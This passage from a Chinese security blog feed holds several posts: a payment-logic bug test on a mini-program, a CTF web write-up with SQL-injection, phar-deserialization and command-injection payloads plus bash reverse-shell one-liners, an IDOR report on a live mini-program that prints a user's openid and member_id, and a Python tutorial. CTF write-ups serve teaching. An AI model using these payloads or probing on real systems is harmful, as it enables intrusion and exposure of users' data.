alt="1663318215105.jpg"                ><br>wc，我要暴富了啊，还等什么，直接开干啊<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/16/6324395009230.png"                      alt="1663318349434.png"                ><br>没想到啊，正当我开心的时候，结算的时候给了我耳光。16.9 我这种穷孩子怎么可能买得起嘛。<br>所以我一不小心，真的是一不小心的。我寻思0.01总得支付吧，谁曾想，我还没付钱呢。<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/16/632439fc77581.png"                      alt="1663318521405.png"                ><br>直接给我成功了，吓死个人，md<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/16/63243a2fe1713.png"                      alt="1663318573294.png"                ><br>白嫖？我怎么可能是这种人。<br>吓得我直接退货了。<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/16/63243a95607cd.png"                      alt="1663318674808.png"                ><br>然后和客服沟通了一下下 ，我生怕他给我退钱过来了，咱可是遵纪守法的好公民啊，这周末能行呢。<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/16/63243acad7149.jpg"                      alt="1663318725870.jpg"                ><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/16/63243af76005f.jpg"                      alt="1663318772768.jpg"                ><br>运营小姐姐打电话来和我说感谢，还好不是喝茶。就告一段落了，所以各位铁汁们，注意网络安全法，千万要做一个遵纪守法的好公民啊</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;记一次小程序支付逻辑漏洞测试&quot;&gt;&lt;a href=&quot;#记一次小程序支付逻辑漏洞测试&quot; class=&quot;headerlink&quot; title=&quot;记一次小程序支付逻辑漏洞测试&quot;&gt;&lt;/a&gt;记一次小程序支付逻辑漏洞测试&lt;/h1&gt;&lt;p&gt;闲来无事，无聊至极，羊了个羊很火，奈何太菜，</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web渗透" scheme="http://example.com/tags/web%E6%B8%97%E9%80%8F/"/>
    
    <category term="小程序" scheme="http://example.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
    <category term="逻辑漏洞" scheme="http://example.com/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>2022第五空间-web部分wp复盘总结</title>
    <link href="http://example.com/2023/05/01/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-web%E9%83%A8%E5%88%86wp%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/05/01/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-web%E9%83%A8%E5%88%86wp%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/</id>
    <published>2023-05-01T13:17:10.000Z</published>
    <updated>2023-08-19T01:00:17.360Z</updated>
    
    <content type="html"><![CDATA[<p>打了一天，麻了，大佬tql，这次get到了不少东西，一是一个不太常见的宽字节注入，我是真的没想到，而且后面也是看了wp理解了好一会才弄明白。</p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h1><p>题目是一个登录框，但是基本上是过滤掉了所有的常见注入的关键词。实在是没思路，后面看了大佬wp，才发现是宽字节注入，同时还要利用虚拟表，同时还有mysql的hex编码。<br>payload：</p><blockquote><p>admin%df%27%09ununionion%09selselectect%091,2,0x6531306164633339343962613539616262653536653035376632306638383365#&amp;password&#x3D;123456</p></blockquote><p>其中 0x6531306164633339343962613539616262653536653035376632306638383365 为 password&#x3D;123456d的hex(md5(password))  利用双写+宽字节构造payload。<br>123456加密后的md5：<code>e10adc3949ba59abbe56e057f20f883e</code><br>因为宽字节的问题所以利用mysql 的hex编码一下：<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/20/63294a569bc17.png"                      alt="1663650389820.png"                ></p><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02:"></a>0x02:</h1><p>一个phar读取flag的操作，遇到这题的时候，phar差不多已经忘光了，首先扫目录得到<code>www.zip</code> 拿到源码进行简单的审计：<br>开始以为是文件上传，后面一看发现是构造phar直接读。<br>得到<code>class.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#new Phar()这里定义了生成的phar文件的名字(这里定义的时候后缀是一定要.phar)</span></span><br><span class="line"><span class="comment">#实际上生成后后缀名也可以改(比如awsl.awsl也行),标志该文件是phar文件的是下面的__HALT那里</span></span><br><span class="line"><span class="variable">$phar</span> =<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;awsl.phar&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">#这里XXX的内容随便写,注意后面的XXX如果不用;来和__HALT分割记得留个空格隔开(个人觉得后面XXX还是写个PHP语句好,省点麻烦)</span></span><br><span class="line"><span class="comment">#__HXXXX(注释里直接用全称会被识别)这一节在这个setStub这里必须保证这个为结尾而且不可省,标志这个为phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="comment">#把要序列化的变量申明好(这里只知道能放序列化的一个变量,不知道怎么放多个(或许单个文件只能放一个序列化的变量))</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="comment">#将目标变量存入(这里自动把它序列化了)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="comment">#这里会按照文件名,文件内容的形式打包到phar文件中,当使用phar://awsl.phar://test.txt就会类似用include包含后面定义的代码(这里文件名不影响是否解析 </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phar反序列化知识点可以看一下这篇文章：<a class="link"   href="https://paper.seebug.org/680/" >利用phar扩展PHP反序列化漏洞<i class="fas fa-external-link-alt"></i></a></p><p>放到本地运行一下，这里记得需要在你PHP版本目录下的<code>php.ini</code>文件里面把<br><code>phar.readonly = off</code> 这一行的注释给去掉，并且改成<code>off</code><br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/20/63294ca42bf25.png"                      alt="1663650977725.png"                ><br>在本地运行php后，目录下会生成一个<code>.phar</code>的文件 因为phar是可以随便修改为<code>jpg</code> <code>png</code> <code>gif</code>的，所以这里直接随便改个后缀，然后上传 再读取的时候 get传参 <code>phar://upload/文件名.jpg</code> 即可得到flag</p><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03:"></a>0x03:</h1><p>一个有趣的<code>RCE</code>题<br>打开发现有个ping 操作。 结合经验猜测是<code>rce</code>，<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/20/63294e1773f1d.png"                      alt="1663651350491.png"                ><br>爆破一下账号密码，得到账号：<code>admin</code> 密码：<code>admin123</code><br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/20/63294ec74550d.png"                      alt="1663651524894.png"                ><br>登录后发现一样的，也是ban掉了很多关键词，利用字典<code>fuzz</code> 一波 这里给大家推荐一个字典：<a><a class="link"   href="https://github.com/TheKingOfDuck/fuzzDicts" >Web Pentesting Fuzz 字典,一个就够了。<i class="fas fa-external-link-alt"></i></a><br>这里看到 %0a可以绕过。<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/20/63294f3b57830.png"                      alt="1663651642650.png"                ><br>这里利用<code>tac%09index.php</code> 查看源码<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/20/63294fb2040f9.png"                      alt="1663651761130.png"                ><br>发现这里过滤了好多命令，看到可疑的目录<code>kylin</code> 但是他把<code>kylin</code>给ban了，构造通配符直接进行<code>flag</code>的读取。<br>payload:</p><blockquote><p>?ip&#x3D;%0Acd%09ky?in%0aca\t%09*<br>成功得到flag：<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/20/63295049a3dfd.png"                      alt="1663651911756.png"                ><br>构造其他payload可以大家可以参考一下这篇：<a class="link"   href="https://blog.csdn.net/loseheart157/article/details/109305380" >RCE漏洞之绕过<i class="fas fa-external-link-alt"></i></a></p></blockquote><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>这次还是学到不少东西，最后成绩28，web队里师傅们ak了 但是最后那个<code>sql注入</code>我是现在还没看懂，所以就没总结了。收获蛮大的。扩展了不少的思路，<code>get</code>到了大佬平时的思路，<code>rce</code>的那题，读文件的时候，队里师傅写了个一句话木马上去，ban了那么多关键词，我是怎么也想不到怎么写上去的。按我平时的思路就是，利用常见的命令 例如<code>echo</code>命令写马，但ban掉了不少东西， 同时，<code>/</code>也被ban了，进目录是没法搞的。但是大佬的思路是啥，日志写马，日志写马倒也是想到过，可是我<code>/</code>给我ban掉了，当时就没想到怎么给进目录，那么自然也就没法写马了，完了请教大佬的时候，大佬给我的是这样的：<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/20/63295213a691e.png"                      alt="1663652370067.png"                ><br>思路是这样的，但是这个绕过属实是骚操作了。<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/20/6329523468105.png"                      alt="1663652403014.png"                ><br>另外还get到一个思路，就是平常的<code>rce</code> 如果是没有过滤掉管道符这种，可以直接利用反弹<code>shell</code>，直接读<code>flag</code><br>具体操作<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/20/632952e25dbde.png"                      alt="1663652577034.png"                ><br>这是linux的一些反弹<code>shell</code>的命令，windows的大家可以自行百度。<br>常用的比如：</p><blockquote><p>&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8080 0&lt;&amp; 2&gt;&amp;1</p></blockquote><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8080 0&gt;&amp;1<br>等等，骚操作还有不少，还有一些空格的绕过之类的操作。可以百度一下，有不少文章可以借鉴参考。<br>思路真的很重要，有时候你只能卡在一个地方走不了， 而大佬可以各种骚操作绕过等。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打了一天，麻了，大佬tql，这次get到了不少东西，一是一个不太常见的宽字节注入，我是真的没想到，而且后面也是看了wp理解了好一会才弄明白。&lt;/p&gt;
&lt;h1 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01:&quot;</summary>
      
    
    
    
    <category term="总结" scheme="http://example.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="总结" scheme="http://example.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>某小程未授权+支付逻辑漏洞</title>
    <link href="http://example.com/2023/05/01/%E6%9F%90%E5%B0%8F%E7%A8%8B%E6%9C%AA%E6%8E%88%E6%9D%83+%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2023/05/01/%E6%9F%90%E5%B0%8F%E7%A8%8B%E6%9C%AA%E6%8E%88%E6%9D%83+%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-05-01T13:17:10.000Z</published>
    <updated>2023-08-18T16:16:40.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="某小程未授权-支付逻辑漏洞"><a href="#某小程未授权-支付逻辑漏洞" class="headerlink" title="某小程未授权+支付逻辑漏洞"></a>某小程未授权+支付逻辑漏洞</h1><p>打开小程序主页 点击个人 抓包发现有id </p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183223736.png"                      alt="image-20230525183223736"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183641445.png"                      alt="image-20230525183641445"                > 点击余额 </p><p>发现有id  发送repeater进行修改尝试</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183252969.png"                      alt="image-20230525183252969"                ></p><p>自己余额id为0 修改其他id</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183304924.png"                      alt="image-20230525183304924"                ></p><p>成功返回余额，直接拼接浏览器访问，发现也可以拿到数据 </p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183312292.png"                      alt="image-20230525183312292"                ></p><p>修改di为1 发现也存在，为了验证存在，直接爆破后四位，1111-9999 发现可以完全遍历 </p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183319671.png"                      alt="image-20230525183319671"                ></p><p>点击余额明细的时候，也可以抓包，可以看别人的</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183330700.png"                      alt="image-20230525183330700"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183344590.png"                      alt="image-20230525183344590"                ></p><p>经过测试，发现基本所有功能点都存在未授权 </p><p>发现一个有意思的地方 他这连充值都是未授权的，也就是可以未授权用它一卡通余额里的钱给他充到小程序里面去，</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183404426.png"                      alt="image-20230525183404426"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183434771.png"                      alt="image-20230525183434771"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525183442831.png"                      alt="image-20230525183442831"                ></p><p> 历史订单处 &#x2F;order&#x2F;list?company_id&#x3D;15&amp;page&#x3D;1&amp;openid&#x3D;oH0xd49hFv19wWTowa7NWRWU4Sl0&amp;member_id&#x3D;227295&amp;charge_status&#x3D;complete</p><p>其他的几处就不详细展示了</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/image-20230525184000557.png"                      alt="image-20230525184000557"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;某小程未授权-支付逻辑漏洞&quot;&gt;&lt;a href=&quot;#某小程未授权-支付逻辑漏洞&quot; class=&quot;headerlink&quot; title=&quot;某小程未授权+支付逻辑漏洞&quot;&gt;&lt;/a&gt;某小程未授权+支付逻辑漏洞&lt;/h1&gt;&lt;p&gt;打开小程序主页 点击个人 抓包发现有id &lt;/p&gt;
</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web渗透" scheme="http://example.com/tags/web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Python中args kwargs参数的一些使用方法</title>
    <link href="http://example.com/2023/03/01/Python%E4%B8%ADargs%20kwargs%E5%8F%82%E6%95%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://example.com/2023/03/01/Python%E4%B8%ADargs%20kwargs%E5%8F%82%E6%95%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</id>
    <published>2023-02-28T16:00:00.000Z</published>
    <updated>2023-08-19T02:48:47.758Z</updated>
    
    <content type="html"><![CDATA[<p>Python中参数传递的一些理解。 大佬勿喷</p><h1 id="参数类型。"><a href="#参数类型。" class="headerlink" title="参数类型。"></a>参数类型。</h1><h2 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h2><p>实参是实际参数，而形参是形式参数，例如 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def func(a,b,c): # 这里的a,b,c 就是形式参数，</span><br><span class="line">print(a,b,c)</span><br><span class="line"></span><br><span class="line">func(12,3,45)     # 这里的12,3，45 就是实参，也就是实际参数</span><br></pre></td></tr></table></figure><h2 id="参数的分类。"><a href="#参数的分类。" class="headerlink" title="参数的分类。"></a>参数的分类。</h2><h3 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def info(name,age,gender):</span><br><span class="line">    print(name,age,gender)</span><br><span class="line"></span><br><span class="line">info(&#x27;张三&#x27;, 23,&#x27;man&#x27;)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/21/6419170e2488f.png"                      alt="1679365898936.png"                ></p><h3 id="关键字参数-默认值参数"><a href="#关键字参数-默认值参数" class="headerlink" title="关键字参数 +默认值参数"></a>关键字参数 +默认值参数</h3><ul><li>关键字参数：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def func(a,b,c):</span><br><span class="line">    print(a,b,c)</span><br><span class="line"></span><br><span class="line">func(a=2,c=1,b=3)</span><br></pre></td></tr></table></figure><p>结果：<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/21/64191724a3f1d.png"                      alt="1679365921655.png"                ></p><p>关键字传参可以不用管参数的位置，但是需要给参数一定的值。</p><ul><li>默认值传参。<br>在现实生活中，我们需要录入很多重复的信息的时候，可以给定一个默认值，比如一个班级的学生，60个男生，5个女生的话，可以默认设置为男性。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def info2(name,age,gender=&#x27;woman&#x27;):</span><br><span class="line">    print(name,age,gender)</span><br><span class="line">info2(&#x27;刘亦菲&#x27;, 19)</span><br></pre></td></tr></table></figure><p>运行结果：<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/21/6419173bb9fc7.png"                      alt="1679365945756.png"                ></p><h3 id="参数对比"><a href="#参数对比" class="headerlink" title="参数对比"></a>参数对比</h3><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/21/6419174c23960.png"                      alt="1679365958048.png"                ><br>结果对比：<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/21/6419175938284.png"                      alt="1679365974917.png"                ></p><p>info函数中gender是没有给定默认值的，所以传参的时候需要给定值</p><h3 id="动态参数"><a href="#动态参数" class="headerlink" title="动态参数"></a>动态参数</h3><h4 id="位置参数-1"><a href="#位置参数-1" class="headerlink" title="位置参数"></a>位置参数</h4><p>在运用过程中，我们可能需要传递的参数是不固定的，有时候参数多，有时候少，那么下面这个就可以解决这个问题。</p><ul><li>*args<br>* args 表示可以接受所有传递进来的位置参数，同时也还可以接受列表和字典类型的传参。<br>例：<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/21/6419176bf1ab2.png"                      alt="1679365992349.png"                ></li></ul><p>这里我们可以看到，我们传入进去的参数，都被以元组类型打印出来了，但是我们直接传参列表和字典，列表和字典都被当做一个参数传递，打印出来的是元组里面的列表和元组里面的字典，而如果我们传递*list和*dict的话 那么传递列表的值就是单独的，而且打印的时候是一个元组。而字典也会被单独传递键名。</p><h4 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h4><ul><li>**kwargs参数传递</li></ul><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/21/6419178691f29.png"                      alt="1679366012583.png"                ></p><p>这里宇*不同的是，**kwargs的参数传递，只能关键字类型的和字典类型的传参，其他的会报错。</p><p>**kwargs 只有在有关键字参数的时候，才会有字典的值</p><h2 id="混合参数的搭配使用"><a href="#混合参数的搭配使用" class="headerlink" title="混合参数的搭配使用"></a>混合参数的搭配使用</h2><p>通过上面的了解，我们有时候需要给定一些固定的位置参数，但是又需要传递未知长度的参数，甚至最后可能还需要给关键字参数，那么我们可以将所学的几种参数搭配使用。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/21/64191798e3aed.png"                      alt="1679366038568.png"                